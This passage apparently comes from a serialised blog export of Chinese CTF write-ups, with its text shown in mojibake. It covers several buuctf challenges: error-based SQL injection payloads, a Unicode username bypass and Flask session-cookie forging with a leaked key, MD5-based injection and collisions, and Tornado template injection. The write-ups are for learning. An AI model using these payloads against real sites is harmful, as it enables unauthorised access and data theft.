æ‹¬å·æ˜¯æ¥åŒ…å«å­æŸ¥è¯¢çš„ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥éƒ½å¯ä»¥ç”¨æ‹¬å·å›´èµ·æ¥ï¼Œè€Œæ‹¬å·çš„ä¸¤ç«¯ï¼Œå¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼  \n\nso æ‰€ä»¥åªèƒ½ç”¨æŠ¥é”™æ³¨å…¥äº†ï¼Œè¿™é‡Œå°±å¥½å¥½å›é¡¾ä¸€ä¸‹æŠ¥é”™æ³¨å…¥\n\nä¸€èˆ¬æŠ¥é”™æ³¨å…¥åˆ†ä¸ºä¸¤ä¸ªå‡½æ•°ï¼šupdatexml() ä¸extractvalue()\n\nå°±æ‹¿updatexmlä¸¾ä¾‹ ä»–ä»¬ä¸¤çš„å·®åˆ«å°±åªæ˜¯ä¼ å‚ä¸Š\n\n`updatexml(1ï¼Œ2ï¼Œ3)`å‡½æ•°æ€»å…±æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå½“ç¬¬äºŒä¸ªå‚æ•°æœ‰ç‰¹æ®Šç¬¦å·æ—¶ï¼Œå°±ä¼šè§¦å‘æ•°æ®åº“æŠ¥é”™ï¼Œè€Œä¸”å°†å‚æ•°2çš„å†…å®¹æ˜¾ç¤ºåœ¨æŠ¥é”™ä¿¡æ¯ä¸­ï¼Œå¸¸ç”¨æ˜¯`~`ä»–çš„åå…­è¿›åˆ¶ç”¨`0x7e`è¡¨ç¤º\n\nç„¶åï¼ŒæŠ¥é”™æ³¨å…¥å¸¸ç”¨æ‹¼æ¥å‡½æ•° concatå’Œgroup_concat\n\n`concat`å’Œ`group_concat`éƒ½æ˜¯ç”¨åœ¨sqlè¯­å¥ä¸­åšæ‹¼æ¥ä½¿ç”¨çš„ï¼Œä½†æ˜¯ä¸¤è€…ä½¿ç”¨çš„æ–¹å¼ä¸å°½ç›¸åŒï¼Œ`concat`æ˜¯é’ˆå¯¹ä»¥è¡Œæ•°æ®åšçš„æ‹¼æ¥ï¼Œè€Œ`group_concat`æ˜¯é’ˆå¯¹åˆ—åšçš„æ•°æ®æ‹¼æ¥ï¼Œä¸”`group_concat`è‡ªåŠ¨ç”Ÿæˆé€—å·ã€‚\n\næ‰€ä»¥æ ¼å¼ä¸€èˆ¬ä¸ºï¼š`updatexml(1,concat(0x7e,sqlè¯­å¥,0x7e),1)`\n\nç„¶è€Œï¼Œ`extractvalue(1ï¼Œ2`)åªæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå½“ç¬¬äºŒä¸ªå‚æ•°å…·æœ‰ç‰¹æ®Šç¬¦å·æ—¶ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚\n\næ ¼å¼ä¸ºï¼š`extractvalue( 1,concat(0x7e,sqlè¯­å¥))`\n\nå›åˆ°é¢˜ç›®ï¼š\n\nå…¶å®é¢˜ç›®æœ¬èº«å°±æ˜¯è€ƒå¯ŸæŠ¥é”™æ³¨å…¥ä¸ç»•è¿‡ç©ºæ ¼ è¿™é‡Œå°±ç®€å•è°¢è°¢payloadï¼š\n\n```\n1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#\n```\n\nXPATH syntax error: '~geek~'\n\n```\n1'or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like('geek')),0x7e),1))#\n```\n\nXPATH syntax error: '~H4rDsq1~'\n\n```\n1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#\n```\n\nXPATH syntax error: '~id,username,password~'\n\n```\n1'or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#\n```\n\nXPATH syntax error: '~1flagflag{9804c176-72e3-46d2-90'\n\nè¿™é‡Œflagæ˜¾ç¤ºçš„ä¸å®Œå…¨ï¼Œç”¨åˆ°left å’Œ rightå‡½æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346493.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346308.png)\n\n```\n1'or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#\n```\n\nXPATH syntax error: '~04c176-72e3-46d2-902b-0e79f4ea1'\n\næŸ¥è¯¢åˆ°å…¶ä½™çš„flag\n\nå› ä¸ºè¿˜æ²³èŸ¹äº†= æ‰€ä»¥ç”¨äº†likeè¯­å¥\n\nå®Œæˆï¼\n","tags":["sqlæ³¨å…¥","æŠ¥é”™æ³¨å…¥","ç©ºæ ¼ç»•è¿‡"],"categories":["buuctf"]},{"title":"buuctf 22-admin","url":"/post/b64980cf.html","content":"\nbuuctf  admin\n\n<!--more-->\n\nè¿™åˆ°é¢˜ç›®æœ‰ä¸€ä¸ªéé¢„æœŸï¼Œå¼±å£ä»¤ç›´æ¥çˆ†å‡ºæ¥äº†ï¼Œç›´æ¥è´¦å·ä¸ºadminï¼Œå¯†ç ä¸º123å°±èƒ½æ‹¿åˆ°flagï¼Œæˆ‘è¿˜æƒ³è¿™é¢˜æ€ä¹ˆè¿™ä¹ˆç®€å•ï¼Œçœ‹äº†åˆ«äººçš„é¢˜è§£æ‰å‘ç°åˆæ˜¯ä¸€é“å­¦ä¹ çš„é¢˜ç›®ã€‚\n\né¢„æœŸè§£ï¼š\n\nå…ˆç”³è¯·ä¸€ä¸ªè´¦å·ï¼ŒæŠ“åŒ…çœ‹åˆ°ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346193.png)\n\né‚£ä¹ˆè¿™é“é¢˜çš„æ€è·¯å°±æ˜¯è®©æˆ‘å»ç™»å½•ç®¡ç†å‘˜çš„è´¦å·å°±èƒ½æ‹¿åˆ°flagäº†ï¼Œä½†æ˜¯ä¸çŸ¥é“å¯†ç \n\nå­¦ä¹ åˆ«äººçš„wpï¼š\n\nåœ¨æºç ä¸­å‘ç°ä¸€ä¸ªgithubé“¾æ¥ï¼š<!-- https://github.com/woadsl1234/hctf_flask/ -->\n\næ‰“å¼€æ˜¯ä¸€ä¸ªflaské¡¹ç›®ï¼ŒFlaskæ˜¯ä¸€ä¸ªç”¨Pythonç¼–å†™çš„Webåº”ç”¨ç¨‹åºæ¡†æ¶\n\næ¯”è¾ƒé‡è¦çš„æ–‡ä»¶å°±æ˜¯ï¼š\n\nuser.sqlè¿™æ˜¯ä¸€ä¸ªå»ºæ•°æ®åº“çš„æ–‡ä»¶\n\nrun.py å°±æ˜¯å¯åŠ¨è¿™ä¸ªç¨‹åº æŠŠç«¯å£å¼€æ”¾åœ¨äº’è”ç½‘ä¸­\n\nappæ–‡ä»¶ä¸­ routes.py å¯¹åº”è·¯ç”± éå¸¸é‡è¦ flaskä¸­å°±æ˜¯ä¸€ä¸ªä¸€ä¸ªè·¯ç”±ç»„æˆçš„\n\næŸ¥çœ‹æºç ï¼š\n\n```php\n#!/usr/bin/env python\n# -*- coding:utf-8 -*-\n\n\nfrom flask import Flask, render_template, url_for, flash, request, redirect, session, make_response\nfrom flask_login import logout_user, LoginManager, current_user, login_user\nfrom app import app, db\nfrom config import Config\nfrom app.models import User\nfrom forms import RegisterForm, LoginForm, NewpasswordForm\nfrom twisted.words.protocols.jabber.xmpp_stringprep import nodeprep\nfrom io import BytesIO\nfrom code import get_verify_code\n\n\n@app.route('/code')\ndef get_code():\n    image, code = get_verify_code()\n    # å›¾ç‰‡ä»¥äºŒè¿›åˆ¶å½¢å¼å†™å…¥\n    buf = BytesIO()\n    image.save(buf, 'jpeg')\n    buf_str = buf.getvalue()\n    # æŠŠbuf_strä½œä¸ºresponseè¿”å›å‰ç«¯ï¼Œå¹¶è®¾ç½®é¦–éƒ¨å­—æ®µ\n    response = make_response(buf_str)\n    response.headers['Content-Type'] = 'image/gif'\n    # å°†éªŒè¯ç å­—ç¬¦ä¸²å‚¨å­˜åœ¨sessionä¸­\n    session['image'] = code\n    return response\n\n\n@app.route('/')\n@app.route('/index')\ndef index():\n    return render_template('index.html', title = 'hctf')\n\n\n@app.route('/register', methods = ['GET', 'POST'])\ndef register():\n\n\n    if current_user.is_authenticated:\n        return redirect(url_for('index'))\n\n\n    form = RegisterForm()\n    if request.method == 'POST':\n        name = strlower(form.username.data)\n        if session.get('image').lower() != form.verify_code.data.lower():\n            flash('Wrong verify code.')\n            return render_template('register.html', title = 'register', form=form)\n        if User.query.filter_by(username = name).first():\n            flash('The username has been registered')\n            return redirect(url_for('register'))\n        user = User(username=name)\n        user.set_password(form.password.data)\n        db.session.add(user)\n        db.session.commit()\n        flash('register successful')\n        return redirect(url_for('login'))\n    return render_template('register.html', title = 'register', form = form)\n\n\n@app.route('/login', methods = ['GET', 'POST'])\ndef login():\n    if current_user.is_authenticated:\n        return redirect(url_for('index'))\n\n\n    form = LoginForm()\n    if request.method == 'POST':\n        name = strlower(form.username.data)\n        session['name'] = name\n        user = User.query.filter_by(username=name).first()\n        if user is None or not user.check_password(form.password.data):\n            flash('Invalid username or password')\n            return redirect(url_for('login'))\n        login_user(user, remember=form.remember_me.data)\n        return redirect(url_for('index'))\n    return render_template('login.html', title = 'login', form = form)\n\n\n@app.route('/logout')\ndef logout():\n    logout_user()\n    return redirect('/index')\n\n\n@app.route('/change', methods = ['GET', 'POST'])\ndef change():\n    if not current_user.is_authenticated:\n        return redirect(url_for('login'))\n    form = NewpasswordForm()\n    if request.method == 'POST':\n        name = strlower(session['name'])\n        user = User.query.filter_by(username=name).first()\n        user.set_password(form.newpassword.data)\n        db.session.commit()\n        flash('change successful')\n        return redirect(url_for('index'))\n    return render_template('change.html', title = 'change', form = form)\n\n\n@app.route('/edit', methods = ['GET', 'POST'])\ndef edit():\n    if request.method == 'POST':\n        \n        flash('post successful')\n        return redirect(url_for('index'))\n    return render_template('edit.html', title = 'edit')\n\n\n@app.errorhandler(404)\ndef page_not_found(error):\n    title = unicode(error)\n    message = error.description\n    return render_template('errors.html', title=title, message=message)\n\n\ndef strlower(username):\n    username = nodeprep.prepare(username)\n    return username\n```\n\n## é¢„æœŸè§£ä¸€ï¼š\n\nunicodeç‰¹æ®Šå­—ç¬¦ç»•è¿‡\n\nä»£ç å®¡è®¡ çœ‹åˆ°ä¸Šé¢æ³¨å†Œï¼Œç™»å½•ï¼Œä¿®æ”¹ç³»ç»Ÿå‡æœ‰ä¸€ä¸ªè½¬å°å†™çš„æ“ä½œstrlower(),å¹¶ä¸”è¿™ä¸ªè½¬å°å†™çš„å‡½æ•°ä¸æ˜¯pythonè‡ªå¸¦çš„ï¼Œæ˜¯è‡ªå·±å°è£…çš„ï¼Œé‚£ä¹ˆè¿™æ˜¯éå¸¸ä¸æ­£å¸¸çš„ã€‚\n\n```php\ndef strlower(username):\n    username = nodeprep.prepare(username)\n    return username\n```\n\nè¿™é‡Œé€šè¿‡è°ƒç”¨nodeprepæ¨¡å—ï¼Œnodeprep.prepareè¿™ä¸ªæ–¹æ³•æ˜¯å°†å¤§å†™å­—æ¯è½¬æ¢æˆå°å†™å­—æ¯ï¼Œä½†æ˜¯å®ƒå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šå®ƒä¼šå°†unicodeç¼–ç çš„á´¬è½¬åŒ–æˆA\n\nåœ¨ä»£ç å¼€å¤´æœ‰ä¸€è¡Œä»£ç ï¼š`from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep`ï¼Œè¯´æ˜nodeprepæ˜¯ä»twistedæ¨¡å—ä¸­å¯¼å…¥çš„ï¼Œåˆ©ç”¨nodeprep.prepareå‡½æ•°ä¼šå°†unicodeå­—ç¬¦á´¬è½¬æ¢æˆAï¼Œè€ŒAåœ¨è°ƒç”¨ä¸€æ¬¡nodeprep.prepareå‡½æ•°ä¼šæŠŠAè½¬æ¢æˆaã€‚è€Œå€¼å¾—æ³¨æ„çš„æ˜¯strlower()è‡ªå®šä¹‰å‡½æ•°è¢«è°ƒç”¨äº†ä¸‰æ¬¡ï¼Œåˆ†åˆ«æ˜¯registerã€loginã€changeï¼Œå³æ³¨å†Œã€ç™»é™†ã€ä¿®æ”¹å¯†ç æ—¶éƒ½ä¼šè¢«è°ƒç”¨ã€‚\n\næ€è·¯ï¼šç”¨á´¬dminæ³¨å†Œï¼Œåå°ä»£ç å°±ä¼šè°ƒç”¨ä¸€æ¬¡nodeprep.prepareå‡½æ•°ï¼ŒæŠŠç”¨æˆ·åè½¬æ¢æˆAdminï¼›ä¿®æ”¹ä¸€æ¬¡å¯†ç ï¼Œå†æ¬¡è°ƒç”¨nodeprep.prepareå‡½æ•°ï¼Œä½¿ç”¨æˆ·åç”±Adminè½¬æ¢ä¸ºadminï¼Œé‡æ–°ç™»é™†ï¼Œå°±å¯ä»¥å¾—åˆ°flagã€‚\n\n## é¢„æœŸè§£äºŒï¼š\n\næŠ“åŒ…å‘ç°session\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346152.png)\n\nflask sessionä¼ªé€ \n\nå…ˆäº†è§£ä¸€ä¸‹sessionï¼šç®€å•è¯´å°±æ˜¯ä¿æŒä¼šè¯ç™»å½•ï¼Œè¯†åˆ«ç”¨æˆ·\n\nä½†æ˜¯ä¸€èˆ¬sessionæ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨çš„ï¼Œä½†æ˜¯flaskå­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œä»–æ˜¯å¯¹ç§°åŠ å¯†è§£å¯†ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œè§£ç ç„¶åä¼ªé€ ç¼–ç ä¸Šä¼ ã€‚\n\nåœ¨config.pyæ‹¿åˆ°å¯†é’¥`ckj123` å¾…ä¼šè¿›è¡ŒåŠ å¯†è§£å¯†çš„æ—¶å€™ç”¨\n\n```php\nimport os\n\n\nclass Config(object):\n    SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'\n    SQLALCHEMY_DATABASE_URI = 'mysql+pymysql://root:adsl1234@db:3306/test'\n    SQLALCHEMY_TRACK_MODIFICATIONS = True\n```\n\nä»ç½‘ä¸Šä¸‹è½½ä¸€ä¸ªsession è§£å¯†åŠ å¯†çš„è„šæœ¬\n\næ„é€ payloadï¼š\n\n```\npython flask_session_cookie_manager3.py decode -c \".eJw9kMFuwjAMhl9l8plDm5YLEgemdB0Hu8qWEjmXCkopTQmTCohRxLsvYhIHS7Z_-f9s36HaDc1pD7PzcGkmUHVbmN3hbQMzKPKPrtBLgbqOUW4PaErB2jqbr5yVKmXPKcrVnn0WUW571iys6688coRSCZRZZE0WZjkmjVdyeGNdJoXkaYgUfRnqVlCu0sKwIPkeGFmChnrUiyhwPAl1Q8eJdXVa6D4msRzRqF8y9hB6IbcdjWoOjwnUp2FXnX_65vg6wfqvA_rlSIavNlcjujJgbMeunQbEaCX5sF5q8-xGrkxYZFNazJ92nV-3zcvp28efZfuvHNc-CLDe1DCBy6kZnl-DOILHHzuQaZg.Y-IrhQ.zQZe9rQP9NoUHeJmwwmmUuZ6x-Q\" -s \"ckj123\"\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346053.png)\n\nå¾—åˆ°ï¼š\n\n```\n{'_fresh': True, '_id': b'8ab92617507e1e6a6cdecd48bf805aba44fda66f90c64046014ea5065530632a578698682e2a864d89f640e1a71cd104def7d2267f789957b31d15fef731fb74', 'csrf_token': b'fde2b35f0dd325646bb89103d3f068da2657ca94', 'image': b'JmGR', 'name': 'abc', 'user_id': '10'}\n```\n\nå°†æˆ‘ä»¬åˆ›å»ºçš„abcæ”¹ä¸ºadmin ç„¶åå†åŠ å¯† bpæŠ“åŒ…ä¿®æ”¹\n\næ„é€ payloadï¼š\n\n```\npython flask_session_cookie_manager3.py encode -t \"{'_fresh': True, '_id': b'8ab92617507e1e6a6cdecd48bf805aba44fda66f90c64046014ea5065530632a578698682e2a864d89f640e1a71cd104def7d2267f789957b31d15fef731fb74', 'csrf_token': b'fde2b35f0dd325646bb89103d3f068da2657ca94', 'image': b'JmGR', 'name': 'admin', 'user_id': '10'}\" -s \"ckj123\"\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346142.png)\n\nå¾—åˆ°ï¼š\n\n```\n.eJw9kLFuwkAMhl-l8syQXMKCxEB1IWWwo2svRPaCKISQC0elAKIE8e49UYnBku1f_j_bd1jt-vq0h8m5v9QjWLVbmNzh7RsmUOTztrALhXYTo94esCoVW3GSL51ok7LnFPVyzz6LKJeOLStx3ZUHjlAbhTqLpMrCLMdk8UoOb2zLpNA8DpGiL0PdKMpNWlSsSL8HRpZgRR3aWRQ4npS5oeNE3CYtbBeTWgxYmV-q5BB6IZeWBjOFxwg2p363Ov909fF1gvjPA_rFQBVfJTcDujJgpGXXjANiEE0-rJdKnt3IlQmrbEyz6dOu9eumfjl9-fijbP6V49oHAdZb3x5hBJdT3T__BnEEjz8Vlmp7.Y-IsQQ.ZB68OAuy6kj1z0CD9iH_lurm7zY\n```\n\næ›´æ¢sessionï¼ŒæˆåŠŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346032.png)\n","tags":["flaskæ¡†æ¶","å¼±å£ä»¤","unicodeç‰¹æ®Šå­—ç¬¦"],"categories":["buuctf"]},{"title":"buuctf 21-[BJDCTF2020]Easy MD5","url":"/post/eef45ee2.html","content":"\nbuuctf [BJDCTF2020]Easy MD5\n\n<!--more-->\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082347242.png)\n\næ€è·¯ï¼šçœ‹åˆ°urlä¸Šåˆpasswordå­—æ ·ï¼Œåˆæœ‰è¾“å…¥æ ï¼Œéšä¾¿ä¼ å…¥adminç„¶åæŠ“åŒ…è¯•è¯•ï¼Œå‘ç°æç¤ºã€‚\n\n![img](https://cdn.nlark.com/yuque/0/2023/png/34855848/1672999105035-1d740daa-ecd7-4e10-b27c-295c05f5b80c.png)\n\næ˜¾ç¤º`select * from 'admin' where password=md5($pass,true)`\n\n**åˆ†æï¼šé€šè¿‡sqlè¯­å¥ï¼Œä»adminè¡¨é‡ŒæŸ¥æ•°æ®ï¼Œå½“password=mdï¼ˆï¼‰å‡½æ•°åŠ å¯†åçš„passæ—¶å°±å¯æŸ¥è¯¢ã€‚**\n\n**è€ƒç‚¹ï¼š**\n\n1. **sqlè¯­å¥æ³¨å…¥**\n2. **md5ï¼ˆï¼‰å‡½æ•°ï¼šæœ¬æ¥åº”è¯¥è¿”å›32 ä½çš„åå…­è¿›åˆ¶æ•°å½¢å¼æ•£åˆ—å€¼ï¼Œä½†æ˜¯æ­¤é¢˜å¯é€‰çš„ binary è¢«è®¾ç½®ä¸º trueï¼Œé‚£ä¹ˆ md5 æ‘˜è¦å°†ä»¥ 16 ä½çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼è¿”å›ã€‚**\n\nçœ‹åˆ°ä½œä¸šæç¤ºmd5åœ¨sqlæ³¨å…¥ä¸­å¸¸è§çš„æ­æ¡£æ˜¯å­—ç¬¦ä¸²ffifdyopï¼Œç„¶åå»è°·æ­Œï¼Œcsdnçœ‹çœ‹è¿™æ˜¯ä»€ä¹ˆä¸œè¥¿ã€‚\n\n**ffifdyop**\n\nç»è¿‡[md5](https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020)åŠ å¯†åï¼š276f722736c95d99e921722cf9ed621c\n\nå†è½¬æ¢ä¸º[å­—ç¬¦ä¸²](https://so.csdn.net/so/search?q=å­—ç¬¦ä¸²&spm=1001.2101.3001.7020)ï¼š'or'6<ä¹±ç >  å³  'or'66ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b\n\n**åŸç†ï¼šmd5ï¼ˆï¼‰å‡½æ•°å…ˆæŠŠ** `**ffifdyop**`**åŠ å¯†ä¸º**`**276f722736c95d99e921722cf9ed621c**`**Mysql åˆä¼šæŠŠ hex ï¼ˆåå…­è¿›åˆ¶ï¼‰è½¬æˆ ascii è§£é‡Š** \n\n åœ¨orçš„ä¸¤è¾¹è¦æœ‰å•å¼•å·ï¼Œä½¿å®ƒå˜æˆ password=â€˜xxxâ€™orâ€˜xxxâ€™ çš„å½¢å¼  \n\n å› æ­¤æ‹¼æ¥ä¹‹åçš„å½¢å¼æ˜¯select * from â€˜adminâ€™ where password=â€™â€™ or â€˜6xxxxxâ€™  ä¸ºä¸€ä¸ªæ°¸çœŸå¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082347249.png)\n\n\n\nè¾“å…¥å¾—åˆ°ä»£ç ï¼š\n\n```php\n$a = $GET['a'];\n$b = $_GET['b'];\n\n\nif($a != $b && md5($a) == md5($b)){\n    // wow, glzjin wants a girl friend.\n```\n\n**åˆ†æï¼šé€šè¿‡getä¼ å‚aï¼Œbï¼Œä½¿å¾—é¢˜ç›®md5å€¼å¼±ç›¸ç­‰ ã€‚**\n\n**æ–¹æ³•ï¼š**\n\n1. **æ•°ç»„ç»•è¿‡**\n2. **md5ï¼ˆï¼‰å€¼ç¢°æ’ï¼Œæœ‰ä¸€äº›ç‰¹æ®Šçš„æ•°å€¼åœ¨md5ï¼ˆï¼‰åŠ å¯†åä¼šå½¢æˆ0eå¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œä»è€Œè¾¾åˆ°å¼±ç›¸ç­‰**\n\n**md5ï¼ˆï¼‰ç¢°æ’åŸç†ï¼š**\n\n```php\n<?php\n$a=md5('QNKCDZO');\n$b=md5('s878926199a');\necho $a;\necho \"\\n\";\necho $b;\necho \"\\n\";\nif($a==$b)\n{\n    echo \"ä»–ä»¬å¼±ç›¸ç­‰\";\n}\n?>\nè¾“å‡ºï¼š\n0e830400451993494058024219903391\n0e545993274517709034328855841020\nä»–ä»¬å¼±ç›¸ç­‰\n```\n\né€‰æ‹©ä»»ä½•æ–¹æ³•éƒ½è¡Œï¼Œä¹‹åå¾—åˆ°ï¼š\n\n```php\n<?php\nerror_reporting(0);\ninclude \"flag.php\";\n\n\nhighlight_file(__FILE__);\n\n\nif($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){\n    echo $flag;\n}\n```\n\nåŒç†ï¼Œä¸è¿‡ä¹‹åæ˜¯å¼ºç±»å‹ç›¸ç­‰ï¼Œä¼°è®¡è¿™ä¸€å…³æ˜¯è€ƒå¯Ÿæ•°ç»„ç»•è¿‡å§ï¼Œä¹‹åå¾—åˆ°flag\n\n\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082347369.png)\n","tags":["md5ç»•è¿‡","ffifdyopç‰¹æ®Šå­—ç¬¦ä¸²"],"categories":["buuctf"]},{"title":"buuctf 20-[æŠ¤ç½‘æ¯ 2018]easy_tornado","url":"/post/98e6259a.html","content":"\nbuuctf 20-[æŠ¤ç½‘æ¯ 2018]easy_tornado\n\n<!--more-->\n\nè¿™æ˜¯ä¸€é“æ¯«æ— å¤´ç»ªçš„é¢˜ç›®ï¼Œå°±å½“ä½œå­¦ä¹ äº†ã€‚\n\nè¿›å…¥ä¹‹åæœ‰ä¸‰ä¸ªé¡µé¢å†…å®¹åˆ†åˆ«ä¸ºï¼š\n\nflag in /fllllllllllllag\n\nrender\n\nmd5(cookie_secret+md5(filename))\n\nå‘ç°è¯·æ±‚è¿‡ç¨‹å¾ˆå¥‡æ€ª\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349588.png)\n\né€šè¿‡filenameè¯·æ±‚ä¸€ä¸ªæ–‡ä»¶ç„¶åfilehashè¯·æ±‚ä¸€ä¸ªå“ˆè¥¿å€¼ ä¹Ÿå°±æ˜¯åŠ å¯†äº†ä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349619.png)\n\nå¦‚æœä¸è¯·æ±‚å“ˆå¸Œå€¼è¯•ä¸€ä¸‹ ç›´æ¥æŠ¥é”™ï¼Œå¹¶ä¸”æ³¨æ„ï¼š`/error?msg=Error`ç›´æ¥æ¥çœ‹å¤§ä½¬çš„wp\n\nrenderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µ ï¼Œå¦‚æœç”¨æˆ·å¯¹renderå†…å®¹å¯æ§ï¼Œä¸ä»…å¯ä»¥æ³¨å…¥XSSä»£ç ï¼Œè€Œä¸”è¿˜å¯ä»¥é€šè¿‡`{{}}`è¿›è¡Œä¼ é€’å˜é‡å’Œæ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼ã€‚\n\nTornadoæ˜¯ä¸€ç§ Web æœåŠ¡å™¨è½¯ä»¶çš„å¼€æºç‰ˆæœ¬ã€‚Tornado å’Œç°åœ¨çš„ä¸»æµ Web æœåŠ¡å™¨æ¡†æ¶ï¼ˆåŒ…æ‹¬å¤§å¤šæ•° Python çš„æ¡†æ¶ï¼‰æœ‰ç€æ˜æ˜¾çš„åŒºåˆ«ï¼šå®ƒæ˜¯éé˜»å¡å¼æœåŠ¡å™¨ï¼Œè€Œä¸”é€Ÿåº¦ç›¸å½“å¿«\n\nåœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡,è¿™é‡Œç”¨åˆ°çš„æ˜¯`handler.settings`ï¼Œ`handler`æŒ‡å‘`RequestHandler`ï¼Œè€Œ`RequestHandler.settings`åˆæŒ‡å‘`self.application.settings`ï¼Œæ‰€ä»¥handler.settingså°±æŒ‡å‘`RequestHandler.application.settings`äº†ï¼Œè¿™é‡Œé¢å°±æ˜¯æˆ‘ä»¬çš„ä¸€äº›ç¯å¢ƒå˜é‡.\n\nç„¶åé€šè¿‡ç¯å¢ƒå˜é‡å»è·å–`cookie_secret`\n\næ„é€ payload ï¼š`/error?msg={{handler.settings}}`\n\nå¾—åˆ°ï¼š`{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '76a26309-3853-4c68-b91e-eee75246e722'}`\n\nå‘ç°äº†`cookie_secret `\n\nä¹‹åå°†`/fllllllllllllag`åŠ å¯†ä¸€ä¸‹å°†`cookie_secret` åŠ ä¸Š å†è¿›è¡Œä¸€æ¬¡md5åŠ å¯†å°±å¯ä»¥è·å¾—flagäº†\n\næ„é€ payloadï¼š`?filename=/fllllllllllllag&filehash=99d14d071426405f00eca73ec4a5eb64`\n\næˆåŠŸï¼\n","tags":["renderæ¸²æŸ“","python","ç¯å¢ƒå˜é‡"],"categories":["buuctf"]},{"title":"buuctf 18-[RoarCTF 2019]Easy Calc","url":"/post/318fd29a.html","content":"\nbuuctf 18-[RoarCTF 2019]Easy Calc\n\n<!--more-->\n\næŠ“åŒ…å‘ç°æäº¤æ–¹å¼ä¸ºï¼š\n\nç»™/cal.php ä»¥getæ–¹å¼æäº¤ä¸€ä¸ª$numå˜é‡\n\nå‘ç°é»‘åå•è¿‡æ»¤\n\n```php\n<?php\nerror_reporting(0);\nif(!isset($_GET['num'])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match('/' . $blackitem . '/m', $str)) {\n                        die(\"what are you want to do?\");\n                }\n        }\n        eval('echo '.$str.';');\n}\n?>\n```\n\nå‘ç°å¥½å¤šè¯»æ–‡ä»¶çš„ç©ºæ ¼ï¼Œæ–œæ éƒ½è¢«é»‘åå•äº†ã€‚\n\ncsdnæœ‰ä¸€ç¯‡æ€»ç»“çš„å¾ˆå¥½ï¼Œæ‹‰è¿‡æ¥\n\nçŸ¥è¯†ç‚¹ï¼š\n\nchr() å‡½æ•°ï¼šä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚ ASCII å€¼å¯è¢«æŒ‡å®šä¸ºåè¿›åˆ¶å€¼ã€å…«è¿›åˆ¶å€¼æˆ–åå…­è¿›åˆ¶å€¼ã€‚å…«è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½®0ï¼Œè€Œåå…­è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0xã€‚\n\n file_get_contents() å‡½æ•°ï¼šæŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚è¯¥å‡½æ•°æ˜¯ç”¨äºæŠŠæ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæœåŠ¡å™¨æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚\n\n PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ï¼šPHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› 